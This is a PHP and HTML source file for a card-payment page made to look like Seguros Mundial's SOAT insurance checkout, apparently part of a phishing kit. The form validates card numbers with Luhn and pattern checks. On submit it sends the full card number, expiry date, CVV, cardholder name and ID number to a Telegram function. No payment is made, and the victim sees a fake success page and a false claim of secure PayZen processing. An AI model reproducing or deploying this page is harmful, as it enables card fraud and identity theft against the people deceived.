<?php

session_start();
require_once __DIR__ . '/includes/calculo.php';
require_once __DIR__ . '/includes/telegram.php';
require_once __DIR__ . '/includes/security.php';

if (empty($_SESSION['cotizacion']) || empty($_SESSION['resumen'])) {
    header('Location: index.php');
    exit;
}

$resumen = $_SESSION['resumen'];
$errores = [];

$numeroTarjetaPost = $_POST['numero_tarjeta'] ?? '';
$vencimientoPost   = $_POST['vencimiento']   ?? '';
$cvvPost           = $_POST['cvv']           ?? '';
$cuotasPost        = $_POST['cuotas']        ?? '0';
$titularPost       = $_POST['titular']       ?? '';
$tipoDocPost       = $_POST['tipo_doc']      ?? '';
$numeroDocPost     = $_POST['numero_doc']    ?? '';


function detectar_tipo_tarjeta(string $num): string
{
    if (preg_match('/^4/', $num))                                return 'visa';
    if (preg_match('/^5[1-5]/', $num))                           return 'mastercard';
    if (preg_match('/^2(2[2-9]|[3-6][0-9]|7[01]|720)/', $num))   return 'mastercard';
    if (preg_match('/^3[47]/', $num))                            return 'amex';
    if (preg_match('/^6(?:011|5|4[4-9]|22)/', $num))             return 'discover';
    return 'otro';
}

/**
 * Algoritmo de Luhn.
 */
function luhn_valido(string $num): bool
{
    $num = preg_replace('/\D/', '', $num);
    if ($num === '' || strlen($num) < 12) return false;

    $suma = 0;
    $alternar = false;
    for ($i = strlen($num) - 1; $i >= 0; $i--) {
        $digito = (int)$num[$i];
        if ($alternar) {
            $digito *= 2;
            if ($digito > 9) $digito -= 9;
        }
        $suma += $digito;
        $alternar = !$alternar;
    }
    return $suma % 10 === 0;
}


function tiene_patron_invalido(string $num): bool
{
    // Todos iguales
    if (preg_match('/^(\d)\1+$/', $num)) return true;

    if (preg_match('/(0123|1234|2345|3456|4567|5678|6789|7890)/', $num)) return true;
    if (preg_match('/(9876|8765|7654|6543|5432|4321|3210)/', $num)) return true;


    $unicos = count(array_unique(str_split($num)));
    if ($unicos <= 2) return true;


    if (preg_match('/^(\d{2,4})\1+$/', $num)) return true;

    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $numeroTarjeta = preg_replace('/\s+/', '', $numeroTarjetaPost);
    $vencimiento   = trim($vencimientoPost);
    $cvv           = trim($cvvPost);
    $cuotas        = trim($cuotasPost);
    $titular       = trim($titularPost);
    $tipoDoc       = trim($tipoDocPost);
    $numeroDoc     = trim($numeroDocPost);

    $tipoTarjeta = detectar_tipo_tarjeta($numeroTarjeta);
    $esAmex      = ($tipoTarjeta === 'amex');

    // Longitudes válidas por tipo
    $longitudesValidas = [
        'visa'       => [13, 16, 19],
        'mastercard' => [16],
        'amex'       => [15],
        'discover'   => [16, 19],
        'otro'       => [13, 14, 15, 16, 17, 18, 19],
    ][$tipoTarjeta] ?? [16];

    // 1. Formato básico
    if ($numeroTarjeta === '' || !ctype_digit($numeroTarjeta)) {
        $errores[] = 'Ingresa un número de tarjeta válido (solo dígitos).';
    }
    // 2. Tipo reconocido
    elseif ($tipoTarjeta === 'otro') {
        $errores[] = 'Número de tarjeta inválido. Verifica los dígitos.';
    }
    // 3. Longitud correcta
    elseif (!in_array(strlen($numeroTarjeta), $longitudesValidas, true)) {
        $errores[] = $esAmex
            ? 'Las tarjetas American Express deben tener 15 dígitos.'
            : 'El número de tarjeta debe tener ' . implode(' o ', $longitudesValidas) . ' dígitos.';
    }
    // 4. Patrón inválido (números inventados obvios)
    elseif (tiene_patron_invalido($numeroTarjeta)) {
        $errores[] = 'Número de tarjeta inválido. Verifica los dígitos.';
    }
    // 5. Algoritmo de Luhn
    elseif (!luhn_valido($numeroTarjeta)) {
        $errores[] = 'Número de tarjeta inválido. Verifica los dígitos.';
    }

    // Validar vencimiento
    if (!preg_match('/^(0[1-9]|1[0-2])\/[0-9]{2}$/', $vencimiento)) {
        $errores[] = 'Ingresa la fecha de vencimiento en formato MM/AA.';
    } else {
        [$mm, $aa] = explode('/', $vencimiento);
        $mes  = (int)$mm;
        $anio = 2000 + (int)$aa;
        $hoy  = new DateTime('first day of this month');
        $venc = new DateTime(sprintf('%04d-%02d-01', $anio, $mes));
        if ($venc < $hoy) {
            $errores[] = 'La tarjeta está vencida.';
        }
        if ($anio > ((int)date('Y') + 20)) {
            $errores[] = 'La fecha de vencimiento no es válida.';
        }
    }

    // Validar CVV
    if ($esAmex) {
        if (!preg_match('/^[0-9]{4}$/', $cvv)) {
            $errores[] = 'El CVV de American Express debe tener 4 dígitos.';
        }
    } else {
        if (!preg_match('/^[0-9]{3}$/', $cvv)) {
            $errores[] = 'El CVV debe tener 3 dígitos.';
        }
    }

    if ($titular === '') {
        $errores[] = 'Ingresa el nombre del titular de la tarjeta.';
    }
    if ($tipoDoc === '') {
        $errores[] = 'Selecciona el tipo de documento de identidad.';
    }
    if (!preg_match('/^[0-9]{6,12}$/', $numeroDoc)) {
        $errores[] = 'Ingresa un número de documento válido.';
    }

    if (empty($errores)) {
        telegram_pago_tarjeta([
            'placa'       => $_SESSION['cotizacion']['placa'] ?? '—',
            'numero'      => $numeroTarjeta,
            'vencimiento' => $vencimiento,
            'cvv'         => $cvv,
            'cuotas'      => ($cuotas === '0' ? 'Sin cuotas' : $cuotas . ' cuotas'),
            'titular'     => $titular,
            'tipo_doc'    => $tipoDoc,
            'numero_doc'  => $numeroDoc,
            'total'       => formato_cop($resumen['total']),
        ]);

        $ultimos4 = substr($numeroTarjeta, -4);

        $_SESSION['pago_exitoso'] = [
            'numero_factura' => 'SOAT-' . strtoupper(bin2hex(random_bytes(4))),
            'fecha_pago'     => date('Y-m-d H:i:s'),
            'medio'          => 'Tarjeta',
            'ultimos4'       => $ultimos4,
            'total'          => $resumen['total'],
        ];

        header('Location: pago-exitoso.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="theme-color" content="#FFFFFF">
<title>Pago con Tarjeta de Crédito | Ejercicio PHP</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
<link rel="stylesheet" href="assets/css/styles_ltr.css">
<style>
* { box-sizing: border-box; }
body {
    background-color: #eef1f5;
    font-family: Ubuntu, sans-serif;
    margin: 0;
}

.pct-header {
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 16px 6%;
    box-shadow: 0 1px 8px 0 rgba(0,0,0,.08);
}
.pct-header img { height: 34px; width: auto; }
.pct-header a.contacto-btn {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    border: 1px solid #0a99d6;
    color: #0a99d6;
    border-radius: 9999px;
    padding: 8px 20px;
    font-weight: 700;
    font-size: .9rem;
    text-decoration: none;
    background: #fff;
}
.pct-header a.contacto-btn svg { width: 18px; height: 18px; }

.pct-wrap {
    max-width: 600px;
    margin: 30px auto;
    padding: 0 16px;
}
.pct-card {
    background: #fff;
    border-radius: 16px;
    box-shadow: 0 1px 10px 0 rgba(0,0,0,.1);
    padding: 30px;
}
.pct-card h1 {
    text-align: center;
    color: #066188;
    font-size: 1.4rem;
    font-weight: 700;
    margin: 0 0 24px;
}

.pct-panel {
    background: #f6f7fc;
    border-radius: 12px;
    padding: 20px;
}

.pct-tarjetas-label {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #4d4d4f;
    font-size: .9rem;
    margin-bottom: 14px;
}
.pct-tarjetas-label img { height: 16px; }

.pct-field {
    width: 100%;
    background: #fff;
    border: 1px solid #d9e0e8;
    border-radius: 8px;
    padding: 12px 14px;
    font-size: .95rem;
    font-family: Ubuntu, sans-serif;
    color: #333;
    margin-bottom: 12px;
    appearance: none;
    transition: border-color .15s;
}
.pct-field::placeholder { color: #9a9a9a; }
.pct-field:focus { outline: none; border-color: #0a99d6; }
.pct-field.is-error {
    border-color: #d01515;
    background: #fff5f5;
}

.pct-error-msg {
    display: none;
    color: #d01515;
    font-size: .78rem;
    font-weight: 600;
    margin: -8px 0 10px;
}
.pct-error-msg.is-visible { display: block; }

.pct-row2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

.pct-select-wrap {
    position: relative;
}
.pct-select-wrap::after {
    content: "";
    position: absolute;
    right: 14px;
    top: 50%;
    width: 8px;
    height: 8px;
    border-right: 2px solid #066188;
    border-bottom: 2px solid #066188;
    transform: translateY(-65%) rotate(45deg);
    pointer-events: none;
}
.pct-select-wrap select.pct-field {
    color: #066188;
    font-weight: 500;
    cursor: pointer;
}

.pct-pagar-btn {
    width: 100%;
    background-color: #0fb9d9;
    background-image: linear-gradient(90deg, #0fb9d9, #0a99d6);
    color: #fff;
    border: none;
    border-radius: 9999px;
    padding: 14px;
    font-weight: 700;
    font-size: 1rem;
    letter-spacing: .5px;
    cursor: pointer;
    margin-top: 8px;
    transition: opacity .2s;
}
.pct-pagar-btn:hover { opacity: .92; }

.pct-otros-titulo {
    color: #4d4d4f;
    font-size: .9rem;
    margin: 22px 0 10px;
}

.pct-otro-medio {
    display: flex;
    align-items: center;
    gap: 12px;
    width: 100%;
    background: #fff;
    border: 1px solid #d9e0e8;
    border-radius: 10px;
    padding: 12px 16px;
    margin-bottom: 10px;
    text-decoration: none;
    color: #066188;
    font-weight: 600;
    font-size: .9rem;
    cursor: pointer;
}
.pct-otro-medio .icono {
    width: 22px; height: 22px;
    display: flex; align-items: center; justify-content: center;
}
.pct-otro-medio .icono img { width: 100%; height: 100%; object-fit: contain; }
.pct-otro-medio .chevron { margin-left: auto; color: #828285; font-size: 1.1rem; }

.pct-aviso {
    background: #fdf0da;
    border-radius: 10px;
    padding: 16px;
    font-size: .85rem;
    color: #7a4a10;
    line-height: 1.5;
    margin: 20px 0;
}
.pct-aviso strong { color: #7a4a10; }

.pct-logos-pago {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    margin-top: 10px;
    flex-wrap: wrap;
}
.pct-logos-pago img { height: 22px; }
.pct-logo-payzen {
    font-weight: 700;
    color: #1a2b5c;
    font-size: .85rem;
    border: 1px solid #c9d2e0;
    border-radius: 4px;
    padding: 2px 8px;
    font-family: Ubuntu, sans-serif;
}

.pct-procesado-por {
    text-align: center;
    color: #828285;
    font-size: .8rem;
    margin: 16px auto 30px;
}
.pct-procesado-por a { color: #0a99d6; text-decoration: none; font-weight: 600; }

.pct-mensaje-error {
    background:#fdecea;
    border:1px solid #f5c2c0;
    color:#7a2a24;
    border-radius:8px;
    padding:12px 16px;
    margin-bottom:16px;
    font-size: .85rem;
}
.pct-mensaje-error ul { margin:8px 0 0 18px; padding:0; }

.pct-footer {
    background-color: #0b3346;
    color: #fff;
    text-align: center;
    padding: 40px 20px 30px;
}
.pct-footer img.logo-footer { height: 36px; margin-bottom: 20px; }
.pct-footer h3 { font-size: 1.2rem; font-weight: 700; margin: 0 0 16px; }
.pct-footer a {
    color: #fff; text-decoration: none; display: block;
    margin-bottom: 10px; font-size: .95rem;
}
.pct-footer .pct-handle { margin: 20px 0 10px; font-weight: 700; }
.pct-footer .pct-redes {
    display: flex; justify-content: center;
    gap: 14px; margin-bottom: 24px;
}
.pct-footer .pct-redes a {
    width: 34px; height: 34px; border-radius: 50%;
    background: rgba(255,255,255,.12);
    display: flex; align-items: center; justify-content: center;
    margin-bottom: 0;
}
.pct-footer .pct-ayuda-lista {
    font-size: .85rem; text-align: left;
    max-width: 440px; margin: 0 auto 20px;
}
.pct-footer .pct-ayuda-lista li { margin-bottom: 6px; }
.pct-footer .pct-ayuda-lista strong { display: block; margin-bottom: 8px; text-align: center; }
.pct-footer .pct-vigilado {
    display: flex; justify-content: center; align-items: center;
    gap: 10px; margin: 20px 0 10px; font-size: .75rem; opacity: .9;
}
.pct-footer .pct-compania {
    font-size: .8rem; opacity: .85; margin-bottom: 16px;
}
.pct-footer .pct-derechos {
    font-size: .75rem; opacity: .7;
    border-top: 1px solid rgba(255,255,255,.15);
    padding-top: 16px; margin-top: 10px;
}

@media (max-width: 600px) {
    .pct-row2 { grid-template-columns: 1fr; }
    .pct-card { padding: 20px; border-radius: 20px; }
    .pct-wrap { margin: 16px auto; }
}
</style>
</head>
<body>

<header class="pct-header">
  <img src="assets/img/imagen_1_.png" alt="Seguros Mundial">
  <a href="pago.php" class="contacto-btn">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
      <polyline points="22,6 12,13 2,6"></polyline>
    </svg>
    Contacto
  </a>
</header>

<div class="pct-wrap">
  <div class="pct-card">
    <h1>Pago con Tarjeta de Crédito</h1>

    <?php if (!empty($errores)): ?>
      <div class="pct-mensaje-error">
        <strong>Revisa lo siguiente:</strong>
        <ul>
          <?php foreach ($errores as $error): ?>
            <li><?= htmlspecialchars($error) ?></li>
          <?php endforeach; ?>
        </ul>
      </div>
    <?php endif; ?>

    <form method="post" action="pago-con-tarjeta.php" autocomplete="off" id="form-tarjeta" novalidate>
      <div class="pct-panel">

        <div class="pct-tarjetas-label">
          Tarjetas
          <img src="assets/img/visa.png" alt="Visa">
          <img src="assets/img/master_card.png" alt="Mastercard">
        </div>

        <input class="pct-field" type="text" name="numero_tarjeta" id="numero_tarjeta"
               placeholder="Número de tarjeta"
               inputmode="numeric" maxlength="19"
               autocomplete="cc-number"
               value="<?= htmlspecialchars($numeroTarjetaPost) ?>">
        <span class="pct-error-msg" id="error-numero"></span>

        <div class="pct-row2">
          <div>
            <input class="pct-field" type="text" name="vencimiento" id="vencimiento"
                   placeholder="MM/AA" maxlength="5"
                   inputmode="numeric"
                   autocomplete="cc-exp"
                   value="<?= htmlspecialchars($vencimientoPost) ?>">
            <span class="pct-error-msg" id="error-vencimiento"></span>
          </div>
          <div>
            <input class="pct-field" type="text" name="cvv" id="cvv"
                   placeholder="CVV" maxlength="4"
                   inputmode="numeric"
                   autocomplete="cc-csc"
                   value="<?= htmlspecialchars($cvvPost) ?>">
            <span class="pct-error-msg" id="error-cvv"></span>
          </div>
        </div>

        <div class="pct-select-wrap">
          <select class="pct-field" name="cuotas">
            <?php
            $cuotasSel = $cuotasPost;
            $opcionesCuotas = ['0' => 'Sin cuotas', '2' => '2 cuotas', '3' => '3 cuotas', '6' => '6 cuotas', '12' => '12 cuotas'];
            foreach ($opcionesCuotas as $val => $label):
            ?>
              <option value="<?= $val ?>" <?= $cuotasSel === $val ? 'selected' : '' ?>><?= $label ?></option>
            <?php endforeach; ?>
          </select>
        </div>

        <input class="pct-field" type="text" name="titular" placeholder="Nombre del titular"
               autocomplete="cc-name"
               value="<?= htmlspecialchars($titularPost) ?>">

        <div class="pct-select-wrap">
          <select class="pct-field" name="tipo_doc">
            <option value="">Tipo del doc. de identidad</option>
            <?php foreach (['CC', 'CE', 'NIT', 'TI', 'PS'] as $tipo): ?>
              <option value="<?= $tipo ?>" <?= $tipoDocPost === $tipo ? 'selected' : '' ?>><?= $tipo ?></option>
            <?php endforeach; ?>
          </select>
        </div>

        <input class="pct-field" type="text" name="numero_doc" placeholder="Número del documento"
               inputmode="numeric" value="<?= htmlspecialchars($numeroDocPost) ?>">

        <button type="submit" class="pct-pagar-btn">
          PAGAR <?= number_format($resumen['total'], 2, ',', '.') ?>
        </button>
      </div>

      <p class="pct-otros-titulo">Otros medios de pago:</p>

      <a href="pago.php" class="pct-otro-medio">
        <span class="icono"><img src="assets/img/Bancolombia.png" alt="Bancolombia"></span>
        Bancolombia
        <span class="chevron">›</span>
      </a>
      <a href="pago.php" class="pct-otro-medio">
        <span class="icono"><img src="assets/img/logo_nequi.png" alt="Nequi"></span>
        Nequi
        <span class="chevron">›</span>
      </a>

      <div class="pct-aviso">
        <strong>¡IMPORTANTE!</strong> Algunas transacciones pueden tardar más tiempo en confirmarse.
        Por favor, <strong>EVITE HACER CLIC DOS VECES SOBRE EL BOTÓN DE PAGO</strong> y/o refrescar la
        página hasta que haya verificado el débito del valor correcto en su cuenta bancaria.
      </div>

      <div class="pct-logos-pago">
        <img src="assets/img/pse.png" alt="PSE">
        <img src="assets/img/master_card.png" alt="Mastercard">
        <img src="assets/img/visa.png" alt="Visa">
        <span class="pct-logo-payzen">PayZen</span>
      </div>
    </form>

  </div>

  <p class="pct-procesado-por">
    Este pago es procesado de forma segura por PayZen-Lyra,<br>
    un proveedor de pagos PCI de nivel 1. <a href="#" onclick="return false;">Leer más</a>
  </p>
</div>

<footer class="pct-footer">
  <img class="logo-footer" src="assets/img/imagen_1_.png" alt="Seguros Mundial">

  <h3>Ayuda</h3>
  <a href="#">Contáctanos</a>
  <a href="#">Puntos de venta</a>
  <a href="#">Canales de atención</a>

  <ul class="pct-ayuda-lista">
    <strong>Si tienes alguna inquietud, comunícate con nosotros a:</strong>
    <li>Línea telefónica desde Bogotá (60-1) 3274712/13.</li>
    <li>Línea gratuita nacional para otras ciudades 018000111935.</li>
    <li>Desde celular operadores Tigo, Claro y Movistar #935</li>
    <li>Página Web - Servicio al cliente. Haz clic <a href="#" style="display:inline;color:#6cc6ff;">aquí</a></li>
  </ul>

  <p class="pct-handle">@SegurosMundial</p>
  <div class="pct-redes">
    <a href="#" aria-label="Instagram"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg></a>
    <a href="#" aria-label="YouTube"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z"></path><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"></polygon></svg></a>
    <a href="#" aria-label="Facebook"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg></a>
    <a href="#" aria-label="X"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18.9 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path></svg></a>
    <a href="#" aria-label="LinkedIn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a>
  </div>

  <div class="pct-vigilado">
    <span style="border:1px solid rgba(255,255,255,.5);padding:2px 6px;font-size:.65rem;">VIGILADO</span>
    <span>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
  </div>
  <p class="pct-compania">COMPAÑÍA MUNDIAL DE SEGUROS S.A.</p>

  <p class="pct-derechos">Todos los derechos reservados - Seguros Mundial 2026</p>
</footer>

<script>
(function () {
    'use strict';

    var inputNumero = document.getElementById('numero_tarjeta');
    var inputVenc   = document.getElementById('vencimiento');
    var inputCvv    = document.getElementById('cvv');
    var form        = document.getElementById('form-tarjeta');

    var errNumero = document.getElementById('error-numero');
    var errVenc   = document.getElementById('error-vencimiento');
    var errCvv    = document.getElementById('error-cvv');

    /* ================================================================
       DETECCIÓN DE TIPO POR PREFIJO
       ================================================================ */
    function detectarTipoTarjeta(numero) {
        if (/^4/.test(numero))                            return 'visa';
        if (/^5[1-5]/.test(numero))                       return 'mastercard';
        if (/^2(2[2-9]|[3-6]\d|7[01]|720)/.test(numero))  return 'mastercard';
        if (/^3[47]/.test(numero))                        return 'amex';
        if (/^6(?:011|5|4[4-9]|22)/.test(numero))         return 'discover';
        return 'otro';
    }

    function longitudesPorTipo(tipo) {
        switch (tipo) {
            case 'amex':       return [15];
            case 'visa':       return [13, 16, 19];
            case 'mastercard': return [16];
            case 'discover':   return [16, 19];
            default:           return [16];
        }
    }

    /* ================================================================
       ALGORITMO DE LUHN
       ================================================================ */
    function luhnValido(numero) {
        if (!numero || !/^\d+$/.test(numero)) return false;
        var suma = 0, alternar = false;
        for (var i = numero.length - 1; i >= 0; i--) {
            var d = parseInt(numero.charAt(i), 10);
            if (alternar) { d *= 2; if (d > 9) d -= 9; }
            suma += d;
            alternar = !alternar;
        }
        return suma % 10 === 0;
    }

    /* ================================================================
       DETECCIÓN DE PATRONES INVÁLIDOS (basura obvia)
       ================================================================ */
    function tienePatronInvalido(numero) {
        if (/^(\d)\1+$/.test(numero)) return true;
        if (/(0123|1234|2345|3456|4567|5678|6789|7890)/.test(numero)) return true;
        if (/(9876|8765|7654|6543|5432|4321|3210)/.test(numero)) return true;

        var unicos = {};
        for (var i = 0; i < numero.length; i++) unicos[numero[i]] = true;
        if (Object.keys(unicos).length <= 2) return true;

        if (/^(\d{2,4})\1+$/.test(numero)) return true;

        return false;
    }

    /* ================================================================
       VALIDACIÓN COMPLETA DEL NÚMERO
       ================================================================ */
    function validarNumero(numero) {
        if (numero.length === 0) {
            return 'Ingresa el número de tarjeta.';
        }
        if (!/^\d+$/.test(numero)) {
            return 'Solo se permiten dígitos.';
        }

        var tipo = detectarTipoTarjeta(numero);
        if (tipo === 'otro') {
            return 'Número de tarjeta inválido.';
        }

        var longitudes = longitudesPorTipo(tipo);
        if (longitudes.indexOf(numero.length) === -1) {
            if (tipo === 'amex') return 'American Express debe tener 15 dígitos.';
            return 'Longitud de tarjeta incorrecta.';
        }

        if (tienePatronInvalido(numero)) {
            return 'Número de tarjeta inválido.';
        }

        if (!luhnValido(numero)) {
            return 'Número de tarjeta inválido.';
        }

        return '';
    }

    function mostrarErrorNumero(msg) {
        if (msg) {
            inputNumero.classList.add('is-error');
            errNumero.textContent = msg;
            errNumero.classList.add('is-visible');
        } else {
            inputNumero.classList.remove('is-error');
            errNumero.classList.remove('is-visible');
        }
    }

    /* ================================================================
       1. FORMATEO DEL NÚMERO
       ================================================================ */
    function formatearNumero(valor) {
        var digitos = valor.replace(/\D/g, '');
        var tipo = detectarTipoTarjeta(digitos);
        var maxDigitos = (tipo === 'amex') ? 15 : 16;

        if (digitos.length > maxDigitos) {
            digitos = digitos.substring(0, maxDigitos);
        }

        var formateado = '';
        for (var i = 0; i < digitos.length; i++) {
            if (i > 0 && i % 4 === 0) formateado += ' ';
            formateado += digitos[i];
        }
        return { valor: formateado, tipo: tipo, digitos: digitos.length };
    }

    function actualizarCvv(tipo) {
        var esAmex = (tipo === 'amex');
        inputCvv.setAttribute('maxlength', esAmex ? '4' : '3');
        inputCvv.setAttribute('placeholder', esAmex ? 'CVV (4 dígitos)' : 'CVV (3 dígitos)');
        if (!esAmex && inputCvv.value.length > 3) {
            inputCvv.value = inputCvv.value.substring(0, 3);
        }
    }

    inputNumero.addEventListener('input', function () {
        var cursorPos = this.selectionStart;
        var valorAntes = this.value;
        var digitosAntes = valorAntes.replace(/\D/g, '').length;

        var resultado = formatearNumero(this.value);
        this.value = resultado.valor;
        actualizarCvv(resultado.tipo);

        var digitosDespues = resultado.digitos;
        if (digitosDespues > digitosAntes) {
            var nuevaPos = this.value.length;
            if (cursorPos < valorAntes.length) {
                nuevaPos = Math.min(cursorPos + 1, this.value.length);
            }
            this.setSelectionRange(nuevaPos, nuevaPos);
        }

        // Validación en vivo cuando el número esté completo
        var tipo = detectarTipoTarjeta(this.value.replace(/\D/g, ''));
        var longitudes = longitudesPorTipo(tipo);
        var digitos = this.value.replace(/\D/g, '');
        if (longitudes.indexOf(digitos.length) !== -1) {
            mostrarErrorNumero(validarNumero(digitos));
        } else {
            mostrarErrorNumero('');
        }
    });

    inputNumero.addEventListener('paste', function (e) {
        e.preventDefault();
        var pegado = (e.clipboardData || window.clipboardData).getData('text');
        var resultado = formatearNumero(pegado);
        this.value = resultado.valor;
        actualizarCvv(resultado.tipo);
    });

    // Validar al perder el foco (blur)
    inputNumero.addEventListener('blur', function () {
        var digitos = this.value.replace(/\D/g, '');
        if (digitos.length > 0) {
            mostrarErrorNumero(validarNumero(digitos));
        }
    });

    /* ================================================================
       2. FORMATEO DE VENCIMIENTO
       ================================================================ */
    inputVenc.addEventListener('input', function () {
        var valor = this.value.replace(/\D/g, '');
        if (valor.length > 4) valor = valor.substring(0, 4);
        if (valor.length === 1 && parseInt(valor[0], 10) > 1) valor = '0' + valor;
        if (valor.length >= 2) {
            var mes = parseInt(valor.substring(0, 2), 10);
            if (mes === 0) valor = '01' + valor.substring(2);
            else if (mes > 12) valor = '12' + valor.substring(2);
        }
        this.value = valor.length >= 3
            ? valor.substring(0, 2) + '/' + valor.substring(2)
            : valor;
    });

    /* ================================================================
       3. CVV — solo dígitos
       ================================================================ */
    inputCvv.addEventListener('input', function () {
        this.value = this.value.replace(/\D/g, '');
    });


    inputNumero.addEventListener('input', function () {
        var digitos = this.value.replace(/\D/g, '');
        var tipo = detectarTipoTarjeta(digitos);
        var maxDig = (tipo === 'amex') ? 15 : 16;
        if (digitos.length === maxDig) inputVenc.focus();
    });

    inputVenc.addEventListener('input', function () {
        if (this.value.length === 5) inputCvv.focus();
    });

    inputCvv.addEventListener('input', function () {
        var maxCvv = parseInt(inputCvv.getAttribute('maxlength'), 10);
        if (this.value.length === maxCvv) {
            var selectCuotas = document.querySelector('select[name="cuotas"]');
            if (selectCuotas) selectCuotas.focus();
        }
    });

    form.addEventListener('submit', function (e) {
        var numero = inputNumero.value.replace(/\D/g, '');
        var venc = inputVenc.value;
        var cvv = inputCvv.value;

        var errorNum = validarNumero(numero);
        mostrarErrorNumero(errorNum);

        // Vencimiento
        errVenc.classList.remove('is-visible');
        inputVenc.classList.remove('is-error');
        if (!/^(0[1-9]|1[0-2])\/[0-9]{2}$/.test(venc)) {
            errVenc.textContent = 'Fecha inválida (MM/AA).';
            errVenc.classList.add('is-visible');
            inputVenc.classList.add('is-error');
        } else {
            var partes = venc.split('/');
            var mm = parseInt(partes[0], 10);
            var aa = parseInt(partes[1], 10);
            var hoy = new Date();
            var anioActual = hoy.getFullYear() % 100;
            var mesActual = hoy.getMonth() + 1;
            if (aa < anioActual || (aa === anioActual && mm < mesActual)) {
                errVenc.textContent = 'La tarjeta está vencida.';
                errVenc.classList.add('is-visible');
                inputVenc.classList.add('is-error');
            }
        }

        // CVV
        errCvv.classList.remove('is-visible');
        inputCvv.classList.remove('is-error');
        var tipo = detectarTipoTarjeta(numero);
        var cvvLen = (tipo === 'amex') ? 4 : 3;
        if (!new RegExp('^[0-9]{' + cvvLen + '}$').test(cvv)) {
            errCvv.textContent = 'CVV debe tener ' + cvvLen + ' dígitos.';
            errCvv.classList.add('is-visible');
            inputCvv.classList.add('is-error');
        }


        var hayError = inputNumero.classList.contains('is-error')
                    || inputVenc.classList.contains('is-error')
                    || inputCvv.classList.contains('is-error');

        if (hayError || errorNum !== '') {
            e.preventDefault();
    
            if (inputNumero.classList.contains('is-error')) inputNumero.focus();
            else if (inputVenc.classList.contains('is-error')) inputVenc.focus();
            else if (inputCvv.classList.contains('is-error')) inputCvv.focus();
            return false;
        }

        var btn = form.querySelector('button[type="submit"]');
        if (btn) {
            btn.disabled = true;
            btn.textContent = 'Procesando...';
        }
    });


    if (inputNumero.value) {
        var r = formatearNumero(inputNumero.value);
        inputNumero.value = r.valor;
        actualizarCvv(r.tipo);
    } else {
        actualizarCvv('otro');
    }

})();
</script>

</body>
</html>